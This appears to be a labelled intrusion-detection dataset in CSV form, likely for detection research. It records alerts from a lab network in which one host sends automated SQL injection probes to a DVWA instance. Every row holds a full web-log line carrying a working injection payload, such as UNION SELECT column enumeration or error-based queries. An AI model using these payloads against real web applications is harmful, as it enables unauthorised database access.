timestamp,rule_id,rule_level,data_id,MITRE_ID,MITRE_Tactic,srcip,dstip,full_log,data_protocol,data_url,label
2025-03-31T21:59:05.883+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:59:04 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88))) HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",2
2025-03-31T21:59:11.906+0700,31152,10,302,T1055,Defense Evasion,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:59:09 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88))) HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",2
2025-03-31T21:59:15.911+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:59:14 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88))) HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))",2
2025-03-31T21:59:21.918+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:59:19 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118))) HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))",2
2025-03-31T21:59:25.924+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:59:24 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120))) HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))",2
2025-03-31T21:59:31.936+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:59:30 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80))) HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))",2
2025-03-31T21:59:35.940+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:59:35 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75))) HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))",2
2025-03-31T21:59:41.948+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:59:40 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116))) HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))",2
2025-03-31T21:59:45.952+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:59:45 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69))) HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))",2
2025-03-31T21:59:51.960+0700,31152,10,302,T1055,Defense Evasion,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:59:50 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65))) HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))",2
2025-03-31T21:59:55.964+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:59:55 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113))) HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))",2
2025-03-31T22:00:01.970+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:00:00 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112))) HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))",2
2025-03-31T22:00:05.969+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:00:05 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106))) HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))",2
2025-03-31T22:00:11.971+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:00:10 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107))) HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))",2
2025-03-31T22:00:15.974+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:00:15 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113))) HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20AND%205650=CONVERT(INT,(UNION%20ALL%20SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))",2
2025-03-31T22:00:31.984+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:00:30 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20AND%20(SELECT%204523%20FROM(SELECT%20COUNT(*),CONCAT(0x716a7a6a71,(SELECT%20(ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a) HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20AND%20(SELECT%204523%20FROM(SELECT%20COUNT(*),CONCAT(0x716a7a6a71,(SELECT%20(ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)",2
2025-03-31T22:00:35.988+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:00:35 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--%20",2
2025-03-31T22:00:41.998+0700,31152,10,302,T1055,Defense Evasion,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:00:40 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX' HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2
2025-03-31T22:00:46.022+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:00:45 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2",2
2025-03-31T22:00:52.015+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:00:50 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3",2
2025-03-31T22:00:56.016+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:00:55 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4",2
2025-03-31T22:01:02.022+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:01:00 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5",2
2025-03-31T22:01:06.026+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:01:05 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6",2
2025-03-31T22:01:12.034+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:01:10 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7",2
2025-03-31T22:01:16.039+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:01:15 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8",2
2025-03-31T22:01:22.045+0700,31152,10,302,T1055,Defense Evasion,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:01:20 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9",2
2025-03-31T22:01:26.052+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:01:25 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10",2
2025-03-31T22:01:32.058+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:01:30 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11",2
2025-03-31T22:01:36.066+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:01:35 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12",2
2025-03-31T22:01:42.072+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:01:40 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13",2
2025-03-31T22:01:46.077+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:08:01:45 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%20'INJ'%7C%7C'ECT'%7C%7C'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14",2
